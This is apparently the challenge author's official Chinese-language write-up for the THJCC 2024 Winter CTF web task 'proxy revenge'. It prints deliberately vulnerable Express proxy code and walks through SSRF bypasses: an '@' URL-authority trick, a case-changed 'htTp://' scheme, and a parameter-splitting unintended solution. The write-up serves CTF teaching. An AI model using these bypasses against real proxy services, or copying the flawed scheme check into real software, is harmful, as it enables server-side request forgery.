---
title: THJCC 2024 Winter proxy revenge Official-Writeup
description: THJCC 2024 Winter
pubDate: 12 15 2024
categories:
  - tech
tags:
  - CTF
---

## 前言

上次打完 THJCC 後跑來當出題組，原本想說還好，但真正要出的時候才發現要控制難度有點困難。 (~~原本沒被 nerf 過的版本希望下次可以出 Revenge Revenge~~)

然後我忘記 subdomain 的 blog 是真的有東西的，所以原本那題 proxy 的出題者增加了許多~~曝光率~~瀏覽次數。

## proxy revenge

* source code

```js!
const express = require('express');
const http = require('http');
const https = require('https');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

function CheckIfHttp(scheme) {
    return scheme.startsWith('http://');
}

app.get('/fetch', (req, res) => {
    const scheme = req.query.scheme;
    const host = req.query.host;
    const path = req.query.path;
    if (!scheme || !host || !path) {
        return res.status(400).send('Missing parameters');
    }
    const client = scheme.startsWith('https') ? https : http;
    const fixedhost = host + '.cggc.chummy.tw'; // oops, I forgot to change it

    if (CheckIfHttp(scheme)) {
        return res.send('Sorry, Only accepts https'); // pls no http :(
    }

    const url = scheme + fixedhost + path;
    console.log('[+] Fetching :', url);
    client.get(url, (response) => {
        let data = '';

        response.on('data', (chunk) => {
            data += chunk;
        });

        response.on('end', () => {
            res.send(data);
        });
    }).on('error', (err) => {
        console.error('Error: ', err.message);
        res.status(500).send('Failed to fetch data from the URL');
    });
});

app.listen(3000, '0.0.0.0', () => {
    console.log('Server running on http://0.0.0.0:3000');
});
```

題目說要你透過這個訪問 `secret.flag.thjcc.tw`
上網查一下就可以知道在沒有硬控制加上 `/` 的情況就可以用 `@` 讓他訪問後面的網址
像是 : 

https://google.com@tusoar.tech  -> 會去 tusoar.tech
https://google.com/@tusoar.tech -> 會去 google.com 然後他會把後面當路徑

好講回來題目，所以我們只需要給一個

```
http://cha-thjcc.scint.org:10068/fetch?scheme=https://&host=blog&path=@secret.flag.thjcc.tw
```

基本來說就可以訪問，但卻顯示

```bash!
Failed to fetch data from the URL
```

去本地看一下錯誤訊息就會知道

```log=
web-1                   | TypeError [ERR_INVALID_PROTOCOL]: Protocol "https:" not supported. Expected "http:"
web-1                   |     at new NodeError (node:internal/errors:372:5)
web-1                   |     at new ClientRequest (node:_http_client:164:11)
web-1                   |     at request (node:http:96:10)
web-1                   |     at Object.get (node:http:107:15)
web-1                   |     at /app/app.js:32:10
web-1                   |     at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
web-1                   |     at next (/app/node_modules/express/lib/router/route.js:149:13)
web-1                   |     at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)
web-1                   |     at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
web-1                   |     at /app/node_modules/express/lib/router/index.js:284:15
```

原來是沒有支援 https，但題目今天給了個檢查

```js!
function CheckIfHttp(scheme) {
    return scheme.startsWith('http://');
}
```

但這其實很好繞，~~又是老梗的檢查大小寫問題~~

```
http://cha-thjcc.scint.org:10068/fetch?scheme=htTp://&host=blog&path=@secret.flag.thjcc.tw
```

> FLAG : THJCC{N0...K42E 5En5171v17Y 12 RE4LLY 1Mp0R74n7.}

--- 

### Unintended Solution

由於我在檢查時使用了 
`scheme.startsWith('http://');`
而不是 `scheme.startsWith('http');`
所以 @legendyang 也利用拼回去的方式解出這題

```
http://cha-thjcc.scint.org:10068/fetch?scheme=http&host=://sec&path=@secret.flag.thjcc.tw:80/
```

這樣也可以拿到 FLAG